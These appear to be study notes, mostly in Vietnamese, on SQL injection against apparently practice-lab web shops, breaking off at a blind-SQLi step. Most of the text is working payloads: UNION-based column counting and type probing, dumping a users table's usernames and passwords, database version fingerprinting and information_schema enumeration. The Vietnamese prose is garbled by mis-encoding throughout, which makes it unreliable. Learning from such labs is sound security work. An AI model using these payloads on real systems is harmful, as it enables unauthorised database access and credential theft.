Test 1: https://shop.com/product.php?id=8'
â†’ Error: You have an error in your SQL syntax near ''' 

Test 2: https://shop.com/product.php?id=8' AND 1=1-- -
â†’ Hiá»ƒn thá»‹ sáº£n pháº©m bÃ¬nh thÆ°á»ng

Test 3: https://shop.com/product.php?id=8' AND 1=2-- -
â†’ KhÃ´ng hiá»ƒn thá»‹ gÃ¬ (blank page)
âœ… Káº¿t luáº­n: CÃ³ SQL Injection

ðŸ§± PHÆ¯Æ NG PHÃP 1: ORDER BY (PhÆ°Æ¡ng phÃ¡p Ä‘áº¿m báº±ng sáº¯p xáº¿p)
Ã tÆ°á»Ÿng gá»‘c
ORDER BY n = yÃªu cáº§u database sáº¯p xáº¿p theo cá»™t thá»© n
Náº¿u cá»™t thá»© n khÃ´ng tá»“n táº¡i, database sáº½ bÃ¡o lá»—i.

Báº¡n thá»­ tÄƒng dáº§n:

ORDER BY 1   â†’ OK
ORDER BY 2   â†’ OK
ORDER BY 3   â†’ lá»—i
â†’ nghÄ©a lÃ  chá»‰ cÃ³ 2 cá»™t

ðŸ§± PHÆ¯Æ NG PHÃP 2: UNION SELECT NULL,... (PhÆ°Æ¡ng phÃ¡p ghÃ©p dÃ²ng)
UNION = ná»‘i thÃªm hÃ ng (row) tá»« má»™t cÃ¢u SELECT khÃ¡c vÃ o bÃªn dÆ°á»›i káº¿t quáº£.
VÃ­ dá»¥:
SELECT id, name, score FROM Students
UNION
SELECT 999, 'Test', 0;
Káº¿t quáº£ sáº½ lÃ :
id	name	score
1	An	9.0
2	BÃ¬nh	8.5
3	Chi	7.0
999	Test	0

Quan trá»ng: UNION chá»‰ hoáº¡t Ä‘á»™ng náº¿u hai SELECT cÃ³ cÃ¹ng sá»‘ cá»™t.
Giá» tÆ°á»Ÿng tÆ°á»£ng: Báº¡n khÃ´ng biáº¿t cÃ¢u SELECT gá»‘c tráº£ vá» bao nhiÃªu cá»™t. NhÆ°ng báº¡n muá»‘n viáº¿t má»™t cÃ¢u UNION khá»›p sá»‘ cá»™t vá»›i nÃ³.
VÃ¬ báº¡n chÆ°a biáº¿t kiá»ƒu dá»¯ liá»‡u tá»«ng cá»™t (sá»‘, chá»¯, ngÃ y thÃ¡ng,â€¦), nÃªn: dÃ¹ng giÃ¡ trá»‹ cá»¥ thá»ƒ (vÃ­ dá»¥ 123, 'ABC') sáº½ ráº¥t dá»… sai kiá»ƒu.
CÃ²n NULL thÃ¬: lÃ  â€œtrá»‘ngâ€ â†’ database tháº¥y á»•n trong háº§u háº¿t kiá»ƒu cá»™t.
ðŸ‘‰ ÄÃ³ lÃ  lÃ½ do dÃ¹ng:
UNION SELECT NULL
UNION SELECT NULL, NULL
UNION SELECT NULL, NULL, NULL
...
EXAMPLE
https://0a2c009903bfc9a780a31c86004b004e.web-security-academy.net/filter category=Accessories
Giáº£ sá»­ truy váº¥n gá»‘c trong DB:
SELECT name, price FROM products WHERE category = 'Accessories' AND released = 1
ta chÃ¨n ' UNION SELECT NULL-- sau Accessories trong URL sáº½ thÃ nh:
SELECT name, price FROM products WHERE category = 'Accessories' UNION SELECT NULL-- -' AND released = 1

sau khi xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c sá»‘ cá»™t theo cÃ¡ch bÃªn trÃªn, ta cáº§n xÃ¡c Ä‘á»‹nh kiá»ƒu dá»¯ liá»‡u, vÃ¬ khi dÃ¹ng UNION SELECT thÃ¬ theo sau pháº£i lÃ  cÃ¡c
cá»™t chá»©a kiá»ƒu dá»¯ liá»‡u khá»›p vá»›i truy váº¥n trÆ°á»›c Ä‘Ã³ nÃªn ta cÅ©ng thá»­ cÃ¡c trÆ°á»ng há»£p dÆ°á»›i Ä‘Ã¢y(giáº£ sá»­ Ä‘Ã£ tÃ¬m ra Ä‘Æ°á»£c ráº±ng cÃ³ 4 cá»™t):
' UNION SELECT 'a',NULL,NULL,NULL--
' UNION SELECT NULL,'a',NULL,NULL--
' UNION SELECT NULL,NULL,'a',NULL--
' UNION SELECT NULL,NULL,NULL,'a'--
náº¿u bÃ¡o lá»—i thÃ¬ thá»­ tiáº¿p khi khÃ´ng lá»—i ná»¯a thÃ¬ oke.

sau khi thá»±c hiá»‡n Ä‘Æ°á»£c cÃ¡c bÆ°á»›c trÃªn lÃ  biáº¿t sá»‘ cá»™t -> kiá»ƒu dá»¯ liá»‡u tá»«ng cá»™t thÃ¬ sau Ä‘Ã³ ta cÃ³ thá»ƒ truy váº¥n cÃ¡c thÃ´ng tin thÃº vá»‹ 
mÃ  ta cáº§n vÃ­ dá»¥:
.../filter?category=Gifts' union select username, password from users-- -
á»Ÿ Ä‘Ã¢y ta Ä‘Ã£ biáº¿t trÆ°á»›c Ä‘Æ°á»£c lÃ  The database contains a different table called users, with columns called username and password.

váº¥n Ä‘á» tiáº¿p theo, vÃ­ dá»¥ truy váº¥n Ä‘áº§u tiÃªn cÃ³ hai cá»™t vá»›i dá»¯ liá»‡u lÃ  sá»‘ vÃ  string, mÃ  dá»¯ liá»‡u ta cáº§n láº¥y lÃ  username vÃ  passwd chá»‰
cÃ³ kiá»ƒu string thÃ´i thÃ¬ pháº£i lÃ m sao? Ä‘Ã¡p Ã¡n lÃ  ta nÃªn truy váº¥n vá»›i tham sá»‘ Ä‘áº§u váº«n lÃ  kiá»ƒu sá»‘ (Ä‘á»ƒ null cÅ©ng Ä‘Æ°á»£c) vÃ  username vÃ  
passwd ta gá»™p láº¡i thÃ nh má»™t tham sá»‘ vá»›i kiá»ƒu string báº±ng cÃ¡ch sau Ä‘Ã¢y:
.../filter?category=Accessories' union select null, username || '~' || password FROM users-- -
káº¿t quáº£ lÃ  username vÃ  passwd Ä‘Æ°á»£c gá»™p thÃ nh má»™t cá»™t nhÆ° sau Ä‘Ã¢y:
wiener~sd3owh795lps65mpfso7
Giant Pillow Thing
administrator~2ptqk3jbmma3ogglyjp4
carlos~sagxavnidrd2oawyo7mz


Querying the database type and version
Database          | type	Query
Microsoft, MySQL	| SELECT @@version
Oracle	          | SELECT * FROM v$version
PostgreSQL	      | SELECT version()
For example, use a UNION attack with the following input: ' UNION SELECT @@version--
!!!!!!!!!! Ä‘Ã´i khi cáº§n thÃªm khoáº£ng tráº¯ng á»Ÿ cuá»‘i (sau dáº¥u --) cÃ³ láº½ Ä‘á»‘i vá»›i csdl MySQL !!!!! 
Ä‘á»ƒ xÃ¡c Ä‘á»‹nh Ä‘Æ°á»£c kiá»ƒu database type vÃ  version thÃ¬ ta cÅ©ng cáº§n pháº£i lÃ m cÃ¡c bÆ°á»›c trÆ°á»›c, xÃ¡c Ä‘á»‹nh sá»‘ cá»™t cá»§a csdl, kiá»ƒu dl cá»§a tá»«ng
cá»™t, sau Ä‘Ã³ truy váº¥n nhÆ° bÃ¬nh thÆ°á»ng, truy váº¥n cho csdl sáº½ chiáº¿m 1 cá»™t:
.../filter?category=Pets' union select @@version, 'b'-- -
.../filter?category=Pets' union select @@version, @@version-- -


Listing the contents of the database
to list the tables in the database: ' UNION SELECT * FROM information_schema.tables / ' UNION SELECT table_name, NULL FROM information_schema.tables--
to list the columns in individual tables: ' UNION SELECT * FROM information_schema.columns WHERE table_name = 'Users'
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_abcdef'--
to retrieve the usernames and passwords for all users:
' UNION SELECT username_abcdef, password_abcdef FROM users_abcdef--
graph TD
    A[Báº¯t Ä‘áº§u] --> B{CÃ³ biáº¿t tÃªn báº£ng?};
    B -->|KhÃ´ng| C[DÃ¹ng information_schema.tables];
    B -->|CÃ³| D{CÃ³ biáº¿t tÃªn cá»™t?};
    D -->|KhÃ´ng| E[DÃ¹ng information_schema.columns];
    D -->|CÃ³| F[Truy váº¥n TRá»°C TIáº¾P báº£ng Ä‘Ã­ch];
    C --> G[TÃ¬m Ä‘Æ°á»£c tÃªn báº£ng];
    E --> H[TÃ¬m Ä‘Æ°á»£c tÃªn cá»™t];
    G --> D;
    H --> F;

BLIND SQLi
XÃ¡c Ä‘á»‹nh Ä‘á»™ dÃ i password: TrackingId=u5YD3PapBcR4lN3e7Tj4' AND 
(SELECT LENGTH(password) FROM users WHERE username='administrator') > 20--






